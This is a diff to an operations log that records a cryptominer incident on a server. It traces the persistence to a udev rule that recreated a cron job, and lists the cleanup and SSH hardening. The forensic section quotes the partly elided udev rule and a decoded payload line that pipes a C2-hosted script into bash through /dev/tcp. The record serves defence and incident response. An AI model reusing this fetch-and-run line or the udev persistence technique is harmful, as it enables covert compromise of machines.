@@ -1,6 +1,68 @@
 # OPS STATE
 
-**Last Updated**: 2026-01-15 (Pass-TEST-UNSKIP-02)
+**Last Updated**: 2026-01-15 (SEC-UDEV-01)
+
+## 2026-01-15 — SEC-UDEV-01: UDEV Persistence Mechanism Found & Removed
+
+**Status**: ✅ RESOLVED
+
+### Incident
+
+User reported 100% CPU usage. Miner process `./90RoDF7G` (PID 6779) consuming 197% CPU since Jan 14.
+
+### Root Cause Found
+
+**UDEV Persistence Rule**: `/etc/udev/rules.d/99-auto-upgrade.rules`
+
+```bash
+SUBSYSTEM=="net", KERNEL!="lo", ACTION=="add", RUN+="/bin/bash -c '...recreate cron...'"
+```
+
+**Attack Flow**:
+1. Every reboot/network event → udev trigger fires
+2. UDEV rule recreates `/etc/cron.d/auto-upgrade`
+3. Cron job (daily at midnight) downloads miner from `http://abcdefghijklmnopqrst.net`
+4. Miner runs as root
+
+**Why it kept coming back**: We deleted the cron job but not the udev rule that recreated it!
+
+### Actions Taken
+
+| Action | Status |
+|--------|--------|
+| Miner process killed (`kill -9 6779`) | ✅ |
+| `/etc/cron.d/auto-upgrade` removed | ✅ |
+| `/etc/udev/rules.d/99-auto-upgrade.rules` removed | ✅ **ROOT CAUSE** |
+| `udevadm control --reload-rules` | ✅ |
+| C2 domain blocked in `/etc/hosts` | ✅ |
+| SSH access restored (AllowUsers + PermitRootLogin fix) | ✅ |
+
+### Forensic Trail
+
+```
+# Decoded cron payload (base64)
+#!/bin/bash
+function __gogo() { ... uses /dev/tcp to fetch from C2 ... }
+__gogo http://abcdefghijklmnopqrst.net | bash
+```
+
+### Related
+
+- SEC-RCA-01 (2026-01-10): Suspected original vector (needs verification — see SEC-RCA-01 for details)
+- Mining pools already blocked in `/etc/hosts` from previous hardening
+
+### SSH Hardening Status
+
+After incident, SSH was temporarily opened for access. Now restored to secure state:
+- `PermitRootLogin prohibit-password` (key-only, no password)
+- `PasswordAuthentication no`
+- `AllowUsers deploy opsadmin root`
+
+### Monitoring
+
+Watch for 2-3 days. If miner returns, deeper persistence exists.
+
+---
 
 ## 2026-01-15 — Pass TEST-UNSKIP-02: Add CI-Safe @smoke Page Load Tests
 
